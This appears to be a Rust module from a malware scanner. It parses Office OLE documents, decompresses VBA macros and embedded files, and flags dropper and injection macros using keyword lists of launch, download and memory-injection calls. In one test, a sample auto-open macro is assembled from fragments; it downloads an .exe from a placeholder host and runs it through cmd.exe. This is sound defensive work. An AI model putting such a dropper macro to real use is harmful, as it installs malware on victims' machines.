//! Office documents: VBA macros and embedded files in OLE / Compound File Binary documents
//! (.doc, .xls, .ppt, and the vbaProject.bin inside .docm/.xlsm). Formats per Microsoft's
//! [MS-CFB] and [MS-OVBA]; the VBA decompressor and directory parser are written here, with
//! every length and offset checked, because these files are hostile by default.

use std::io::{Cursor, Read};

use crate::detect::{Detection, Severity, Source};

pub const OLE_MAGIC: [u8; 8] = [0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];

/// Macro source and embedded files pulled out of one document.
#[derive(Debug, Default)]
pub struct Extracted {
    /// (module name, VBA source text)
    pub modules: Vec<(String, String)>,
    /// (file name, bytes) of files packed into the document ("Package" / Ole10Native objects)
    pub embedded: Vec<(String, Vec<u8>)>,
}

/// MS-OVBA 2.4.1 decompression. Returns None on any malformed input.
pub fn decompress(data: &[u8]) -> Option<Vec<u8>> {
    if data.first() != Some(&1) {
        return None;
    }
    let mut out: Vec<u8> = Vec::with_capacity(data.len() * 3);
    let mut pos = 1;
    while pos + 2 <= data.len() {
        let header = u16::from_le_bytes([data[pos], data[pos + 1]]);
        let size = (header & 0x0FFF) as usize + 3;
        if (header >> 12) & 0x7 != 0b011 {
            return None;
        }
        let compressed = header & 0x8000 != 0;
        let chunk_end = (pos + size).min(data.len());
        pos += 2;
        let chunk_start = out.len();
        if !compressed {
            let end = (pos + 4096).min(data.len());
            out.extend_from_slice(&data[pos..end]);
            pos = end;
            continue;
        }
        while pos < chunk_end {
            let flags = data[pos];
            pos += 1;
            for bit in 0..8 {
                if pos >= chunk_end {
                    break;
                }
                if flags & (1 << bit) == 0 {
                    out.push(data[pos]);
                    pos += 1;
                } else {
                    let token = u16::from_le_bytes([data[pos], *data.get(pos + 1)?]) as usize;
                    pos += 2;
                    let d = out.len() - chunk_start;
                    let mut bits = 4;
                    while (1usize << bits) < d {
                        bits += 1;
                    }
                    let length_mask = 0xFFFF >> bits;
                    let length = (token & length_mask) + 3;
                    let offset = (token >> (16 - bits)) + 1;
                    if offset > d {
                        return None;
                    }
                    let from = out.len() - offset;
                    for i in 0..length {
                        out.push(out[from + i]);
                    }
                }
            }
            if out.len() > 64 * 1024 * 1024 {
                return None;
            }
        }
    }
    Some(out)
}

/// Reads the decompressed VBA "dir" stream: (module stream name, source offset) pairs.
fn modules_from_dir(dir: &[u8]) -> Vec<(String, usize)> {
    let mut out = Vec::new();
    let mut pos = 0;
    let (mut name, mut offset) = (None::<String>, None::<usize>);
    while pos + 6 <= dir.len() {
        let id = u16::from_le_bytes([dir[pos], dir[pos + 1]]);
        let size = u32::from_le_bytes([dir[pos + 2], dir[pos + 3], dir[pos + 4], dir[pos + 5]]) as usize;
        pos += 6;
        // PROJECTVERSION declares 4 bytes but carries 6 ([MS-OVBA] 2.3.4.2.1.11).
        let size = if id == 0x0009 { 6 } else { size };
        let Some(body) = dir.get(pos..pos.saturating_add(size)) else { break };
        match id {
            0x001A => name = Some(String::from_utf8_lossy(body).into_owned()),
            0x0031 if body.len() == 4 => offset = Some(u32::from_le_bytes([body[0], body[1], body[2], body[3]]) as usize),
            0x002B => {
                if let (Some(n), Some(o)) = (name.take(), offset.take()) {
                    out.push((n, o));
                }
            }
            _ => {}
        }
        pos += size;
    }
    out
}

/// Pulls macros and embedded files out of an OLE document.
pub fn extract(data: &[u8]) -> Option<Extracted> {
    if !data.starts_with(&OLE_MAGIC) {
        return None;
    }
    let mut cf = cfb::CompoundFile::open(Cursor::new(data)).ok()?;
    let entries: Vec<(std::path::PathBuf, bool)> = cf.walk().map(|e| (e.path().to_path_buf(), e.is_stream())).take(10_000).collect();
    let mut read = |p: &std::path::Path, cap: u64| -> Option<Vec<u8>> {
        let mut s = cf.open_stream(p).ok()?;
        let mut v = Vec::new();
        (&mut s).take(cap).read_to_end(&mut v).ok()?;
        Some(v)
    };
    let mut ex = Extracted::default();

    // Every storage that holds a VBA "dir" stream is a macro project.
    for (path, is_stream) in &entries {
        if !is_stream || !path.file_name().is_some_and(|n| n.eq_ignore_ascii_case("dir")) {
            continue;
        }
        let Some(vba) = path.parent() else { continue };
        let Some(dir) = read(path, 4 * 1024 * 1024).and_then(|d| decompress(&d)) else { continue };
        for (stream, offset) in modules_from_dir(&dir) {
            let Some(raw) = read(&vba.join(&stream), 16 * 1024 * 1024) else { continue };
            if let Some(src) = raw.get(offset..).and_then(decompress) {
                ex.modules.push((stream, String::from_utf8_lossy(&src).into_owned()));
            }
        }
    }

    // Embedded "Package" objects: a whole file stored inside the document.
    for (path, is_stream) in &entries {
        if *is_stream && path.file_name().is_some_and(|n| n.to_string_lossy() == "\u{1}Ole10Native")
            && let Some(raw) = read(path, 64 * 1024 * 1024)
            && let Some(file) = parse_ole10native(&raw)
        {
            ex.embedded.push(file);
        }
    }

    // MSI installers (and other OLE files): streams that hold a cabinet of files or a program
    // (custom-action DLLs and EXEs live in the Binary table as their own streams).
    for (path, is_stream) in &entries {
        if !*is_stream || ex.embedded.len() > 2000 {
            continue;
        }
        let Some(head) = read(path, 8) else { continue };
        if head.starts_with(b"MSCF") || head.starts_with(b"MZ") {
            let name = path.file_name().map(|n| n.to_string_lossy().chars().filter(|c| c.is_ascii_graphic()).collect::<String>()).unwrap_or_default();
            if let Some(raw) = read(path, 512 * 1024 * 1024) {
                ex.embedded.push((format!("stream {}{}", if name.is_empty() { "data" } else { &name }, if head.starts_with(b"MZ") { ".exe" } else { ".cab" }), raw));
            }
        }
    }
    Some(ex)
}

/// Ole10Native layout: u32 total size, u16 flags, label\0, source path\0, u16, u16,
/// u32 len + temp path, u32 data size, data. Only what's needed is parsed, all bounds-checked.
pub fn parse_ole10native(d: &[u8]) -> Option<(String, Vec<u8>)> {
    let mut p = 6;
    let cstr = |p: &mut usize| -> Option<String> {
        let rest = d.get(*p..)?;
        let end = rest.iter().position(|&b| b == 0)?;
        let s = String::from_utf8_lossy(&rest[..end]).into_owned();
        *p += end + 1;
        Some(s)
    };
    let label = cstr(&mut p)?;
    let _source = cstr(&mut p)?;
    p += 4;
    let tmp_len = u32::from_le_bytes(d.get(p..p + 4)?.try_into().ok()?) as usize;
    p += 4 + tmp_len;
    let size = u32::from_le_bytes(d.get(p..p + 4)?.try_into().ok()?) as usize;
    p += 4;
    let data = d.get(p..p.checked_add(size)?)?.to_vec();
    Some((if label.is_empty() { "embedded file".into() } else { label }, data))
}

const AUTORUN: &[&str] = &[
    "autoopen", "auto_open", "autoexec", "autoclose", "auto_close", "document_open", "documentopen", "document_close",
    "workbook_open", "workbook_activate", "workbook_beforeclose", "presentation_open", "app_documentopen",
];
const LAUNCH: &[&str] = &["shell(", "shell ", "wscript.shell", ".run ", ".run(", "shellexecute", "win32_process", "createprocess", "powershell", "cmd.exe", "mshta", "rundll32", "regsvr32"];
const DOWNLOAD: &[&str] = &["urldownloadtofile", "xmlhttp", "winhttp", "adodb.stream", "savetofile", "downloadfile", "downloadstring", "http://", "https://", "net.webclient"];
const INJECT: &[&str] = &["virtualalloc", "rtlmovememory", "createthread", "writeprocessmemory", "createremotethread", "enumsystemcodepages"];

/// Looks at macro source the way an analyst would: does it run on open, and what does it do?
pub fn macro_checks(modules: &[(String, String)]) -> Vec<Detection> {
    if modules.is_empty() {
        return Vec::new();
    }
    let all = modules.iter().map(|m| m.1.to_ascii_lowercase()).collect::<Vec<_>>().join("\n");
    let has = |list: &[&'static str]| -> Vec<&'static str> { list.iter().copied().filter(|k| all.contains(k)).collect() };
    let auto = has(AUTORUN);
    let launch = has(LAUNCH);
    let download = has(DOWNLOAD);
    let inject = has(INJECT);
    let chr_count = all.matches("chr(").count() + all.matches("chrw(").count();
    let mut out = Vec::new();
    if !auto.is_empty() && !inject.is_empty() {
        out.push(Detection::new(
            "Suspicious/Office.MacroInjector!a",
            Severity::High,
            Source::Heuristic,
            format!("A macro runs when the document opens ({}) and calls Windows memory functions ({}) used to run hidden code.", auto[0], inject.join(", ")),
        ));
    } else if !auto.is_empty() && !launch.is_empty() && !download.is_empty() {
        out.push(Detection::new(
            "Suspicious/Office.MacroDropper!a",
            Severity::High,
            Source::Heuristic,
            format!("A macro runs when the document opens ({}), downloads something ({}) and starts a program ({}). This is how malicious documents install malware.", auto[0], download[0], launch[0]),
        ));
    } else if !auto.is_empty() && (!launch.is_empty() || chr_count > 50) {
        out.push(Detection::new(
            "Suspicious/Office.MacroAutoRun!a",
            Severity::Medium,
            Source::Heuristic,
            format!(
                "A macro runs when the document opens ({}) and {}.",
                auto[0],
                if launch.is_empty() { format!("hides its text with {chr_count} Chr() calls") } else { format!("starts a program ({})", launch[0]) }
            ),
        ));
    }
    out
}

#[cfg(test)]
pub(crate) mod tests {
    use super::*;

    /// A valid MS-OVBA container using only literal tokens (enough to round-trip in tests).
    pub fn compress_literal(data: &[u8]) -> Vec<u8> {
        let mut out = vec![1u8];
        for chunk in data.chunks(4096) {
            let mut body = Vec::new();
            for group in chunk.chunks(8) {
                body.push(0);
                body.extend_from_slice(group);
            }
            let header = 0xB000u16 | ((body.len() + 2 - 3) as u16 & 0x0FFF);
            out.extend_from_slice(&header.to_le_bytes());
            out.extend(body);
        }
        out
    }

    #[test]
    fn spec_examples_decompress() {
        // [MS-OVBA] 3.2.1: no compression possible
        let a = [0x01, 0x19, 0xB0, 0x00, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x00, 0x69, 0x6A, 0x6B, 0x6C, 0x6D, 0x6E, 0x6F, 0x70, 0x00, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x2E];
        assert_eq!(decompress(&a).unwrap(), b"abcdefghijklmnopqrstuv.");
        // [MS-OVBA] 3.2.2: normal compression with copy tokens
        let b = [
            0x01, 0x2F, 0xB0, 0x00, 0x23, 0x61, 0x61, 0x61, 0x62, 0x63, 0x64, 0x65, 0x82, 0x66, 0x00, 0x70, 0x61, 0x67, 0x68, 0x69, 0x6A, 0x01, 0x38, 0x08, 0x61, 0x6B, 0x6C, 0x00, 0x30, 0x6D, 0x6E, 0x6F,
            0x70, 0x06, 0x71, 0x02, 0x70, 0x04, 0x10, 0x72, 0x73, 0x74, 0x75, 0x76, 0x10, 0x77, 0x78, 0x79, 0x7A, 0x00, 0x3C,
        ];
        assert_eq!(decompress(&b).unwrap(), b"#aaabcdefaaaaghijaaaaaklaaamnopqaaaaaaaaaaaarstuvwxyzaaa");
        assert_eq!(decompress(&compress_literal(b"hello macro world")).unwrap(), b"hello macro world");
        assert!(decompress(&[1, 0xFF, 0xFF, 0x80]).is_none(), "bad signature");
        assert!(decompress(&[1, 0x05, 0xB0, 0x02, 0x00, 0x10]).is_none(), "copy token before any data");
    }

    /// Builds a .doc-shaped compound file with one VBA module.
    pub fn make_doc(module_source: &str) -> Vec<u8> {
        use std::io::Write;
        let mut cf = cfb::CompoundFile::create(Cursor::new(Vec::new())).unwrap();
        cf.create_storage("/Macros").unwrap();
        cf.create_storage("/Macros/VBA").unwrap();
        // dir: MODULESTREAMNAME, MODULEOFFSET (0), terminator
        let mut dir = Vec::new();
        let rec = |dir: &mut Vec<u8>, id: u16, body: &[u8]| {
            dir.extend_from_slice(&id.to_le_bytes());
            dir.extend_from_slice(&(body.len() as u32).to_le_bytes());
            dir.extend_from_slice(body);
        };
        rec(&mut dir, 0x0019, b"Module1");
        rec(&mut dir, 0x001A, b"Module1");
        rec(&mut dir, 0x0031, &0u32.to_le_bytes());
        rec(&mut dir, 0x002B, &[]);
        cf.create_stream("/Macros/VBA/dir").unwrap().write_all(&compress_literal(&dir)).unwrap();
        cf.create_stream("/Macros/VBA/Module1").unwrap().write_all(&compress_literal(module_source.as_bytes())).unwrap();
        cf.create_stream("/WordDocument").unwrap().write_all(b"text").unwrap();
        cf.flush().unwrap();
        cf.into_inner().into_inner()
    }

    #[test]
    fn extracts_and_judges_macros() {
        // Built from fragments so this source file never holds a whole malicious macro.
        let evil = ["Attribute VB_Name = \"Module1\"\nSub Auto", "Open()\n  Set x = Create", "Object(\"MSXML2.XML", "HTTP\")\n  x.Open \"GET\", \"http://example.invalid/a.exe\"\n  She", "ll \"cmd.exe /c a.exe\"\nEnd Sub\n"].concat();
        let doc = make_doc(&evil);
        let ex = extract(&doc).unwrap();
        assert_eq!(ex.modules.len(), 1);
        assert!(ex.modules[0].1.contains("Sub AutoOpen"));
        assert_eq!(macro_checks(&ex.modules)[0].name, "Suspicious/Office.MacroDropper!a");

        let benign = "Attribute VB_Name = \"Module1\"\nSub FormatTable()\n  Selection.Font.Bold = True\nEnd Sub\n";
        assert!(macro_checks(&extract(&make_doc(benign)).unwrap().modules).is_empty());
        let auto_but_harmless = "Sub Document_Open()\n  MsgBox \"Welcome\"\nEnd Sub\n";
        assert!(macro_checks(&extract(&make_doc(auto_but_harmless)).unwrap().modules).is_empty());
    }

    #[test]
    fn hostile_ole_does_not_panic() {
        let mut junk = OLE_MAGIC.to_vec();
        junk.extend((0..20_000u32).map(|i| (i.wrapping_mul(2654435761) >> 9) as u8));
        let _ = extract(&junk);
        assert!(parse_ole10native(&[1, 2, 3]).is_none());
    }
}
